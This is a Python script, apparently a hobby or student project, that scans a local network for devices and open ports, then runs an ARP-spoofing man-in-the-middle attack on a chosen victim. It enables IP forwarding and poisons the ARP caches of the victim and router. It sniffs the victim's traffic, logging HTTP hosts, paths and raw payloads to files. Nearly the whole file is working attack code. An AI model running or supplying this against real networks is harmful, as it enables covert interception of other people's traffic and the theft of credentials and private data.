import os
import subprocess
import sys
import time
import socket

from scapy.all import ARP, Ether, send, srp, sniff, wrpcap, IP, Raw, TCP
from scapy.layers.http import HTTPRequest  # Import HTTP packet module
from scapy.all import Raw  # Import Raw packet module


def check_root():
    if os.geteuid() != 0:
        print("This script requires superuser privileges. Please run it with sudo.")
        sys.exit(1)


def getInfo():
    print("~~~Getting addresses...")
    interface = 'wlp2s0'
    victimIP = '192.168.1.240'
    routerIP = '192.168.1.254'
    return [interface, victimIP, routerIP]


def discover_devices():
    arp = ARP(pdst="192.168.1.0/24")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    print(f"Mac Arp: {ether}")
    packet = ether / arp
    print(packet)

    result = srp(packet, timeout=5, verbose=0)[0]

    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    return devices


def scan_ports(ip, port_range):
    print(f"Scanning ports on IP {ip}...")
    open_ports = []
    i = 0
    for port in port_range:
        print(f"Scanning port{port_range} (Loop-{i}...")
        i = i + 1
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((ip, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports


def enable_ip_forwarding():
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True, text=True)
    print("IP forwarding enabled")


def disable_ip_forwarding():
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True, text=True)
    print("IP forwarding disabled")


def get_mac_address(ip_address):
    try:
        subprocess.run(["ping", "-c", "1", ip_address], capture_output=True, text=True, check=True)
        result = subprocess.run(["arp", "-n", ip_address], capture_output=True, text=True, check=True)
        for line in result.stdout.split('\n'):
            if ip_address in line:
                parts = line.split()
                if len(parts) >= 3:
                    return parts[2]
        print(f"MAC address for {ip_address} not found")
    except subprocess.CalledProcessError as e:
        print(f"Error getting MAC address: {e}")
        sys.exit(1)


def reassignARP(victimIP, routerIP, victimMAC, routerMAC):
    print("~~~Reassigning ARPS...")
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC, hwsrc=victimMAC), count=10)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC, hwsrc=routerMAC), count=10)
    disable_ip_forwarding()


def attack(victimIP, victimMAC, routerIP, routerMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))


def packet_callback(packet):
    if packet.haslayer(HTTPRequest):
        http_layer = packet.getlayer(HTTPRequest)
        ip_layer = packet.getlayer(IP)

        #print("Http_payload -> ", packet.summary)
        try:
            print(" Http connection found, with payload ->", packet[Raw].load)

        except:
            print("No Raw data---")

        with open("HTTP_packets.txt", "a") as f:
            f.write(
                f"\n{ip_layer.src} requested {http_layer.Host.decode(errors='ignore')}{http_layer.Path.decode(errors='ignore')}\n")
            if packet.haslayer(Raw):
                f.write(f"  --Raw data: {packet[Raw].load.decode(errors='ignore')}\n")

    with open("all_data_and_dump.txt", "a") as f:
        f.write(f"Packet: {packet.summary()}\n")
        #packet.show()
        try:
            f.write(packet.show(dump=True) + '\n\n')  # Dump detailed packet content
        except Exception as e:
            f.write("\n")

    with open("only_loads.txt", "a") as f:
        try:
            f.write(f"Packet: {packet.load}\n")
        except:
            f.write(f"Packet: '--Empty--'\n")


def manInTheMiddle(ip_victim):
    check_root()
    info = getInfo()
    enable_ip_forwarding()
    mac_address = get_mac_address(ip_victim)
    if mac_address:
        print(f"MAC address for {ip_victim} is {mac_address}")
    ma_router = get_mac_address(info[2])
    if ma_router:
        print(f"MAC address for {info[2]} is {ma_router}")
    print("~~~Victim MAC: %s" % mac_address)
    print("~~~Router MAC: %s" % ma_router)
    print("~~~Attacking...")

    try:
        while True:
            attack(ip_victim, mac_address, info[2], ma_router)
            sniff(prn=packet_callback, filter=f"host {ip_victim}", iface=info[0], store=0)
            time.sleep(0.5)

    except KeyboardInterrupt:
        reassignARP(ip_victim, info[2], mac_address, ma_router)
        print("\nStopping MITM attack and restoring ARP tables.")
        sys.exit(1)

    print("...Sniffing packets...")


def main():
    #sub_net=input("Insira a sua Sub-Net: ")
    devices = discover_devices()
    cicle = 1
    for device in devices:
        print("Device[s] -->  ", cicle)
        print(f"IP: {device['ip']}, MAC: {device['mac']}")
        cicle = cicle + 1

    ip_to_scan = input("Enter the IP address to scan for open ports: ")

    if ip_to_scan != "":
        try:
            socket.inet_aton(ip_to_scan)  # Validate IP
        except socket.error:
            print("Invalid IP address.")
            return

        port_range = range(5550, 5570)  # You can adjust the port range as needed
        open_ports = scan_ports(ip_to_scan, port_range)

        if open_ports:
            print(f"Open ports on {ip_to_scan}: {open_ports}")
        else:
            print(f"No open ports found on {ip_to_scan}.")

    ip_victim = input("Insira o IP da vitima: ")
    manInTheMiddle(ip_victim)


main()
